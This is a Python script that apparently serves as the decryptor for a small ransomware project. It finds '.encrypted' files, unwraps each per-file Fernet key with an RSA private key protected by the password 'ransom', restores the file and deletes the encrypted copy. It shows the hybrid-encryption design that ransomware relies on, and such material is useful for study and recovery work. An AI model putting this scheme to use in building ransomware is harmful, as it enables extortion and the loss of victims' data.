import os
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.fernet import Fernet

private_key = None

def init ():
    global private_key
    # pem = privacy enhanced mail
    with open('key.pem', 'rb') as key_file:
        private_key = serialization.load_pem_private_key(
                        key_file.read(),
                        password=b'ransom')

def decrypt_file(path):
    with open(path, 'rb') as f:
        data = f.read().split('\n----- data -----\n'.encode('utf-8'))
        key = decrypt_key(data[0])
        encrypted_data = data[1]
    f = Fernet(key)
    decrypted_data = f.decrypt(encrypted_data)
    with open(path.rsplit('.', 1)[0], 'wb') as file:
        file.write(decrypted_data)
    os.remove(path)


def decrypt_key (key):
    if private_key is not None:
        return private_key.decrypt(key, 
                                padding.OAEP(
                                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                    algorithm=hashes.SHA256(),
                                    label=None)
                                )

                                
def locate_files (path, exts):
    file_paths = []
    for root, _, files in os.walk(path):
        for file in files:
            if file.split('.')[-1] in exts:
                file_paths.append(root + '/' + file)
    return file_paths

if __name__ == '__main__':
    init()
    path = '.'
    paths = locate_files(path, ['encrypted'])
    for path in paths:
        decrypt_file(path)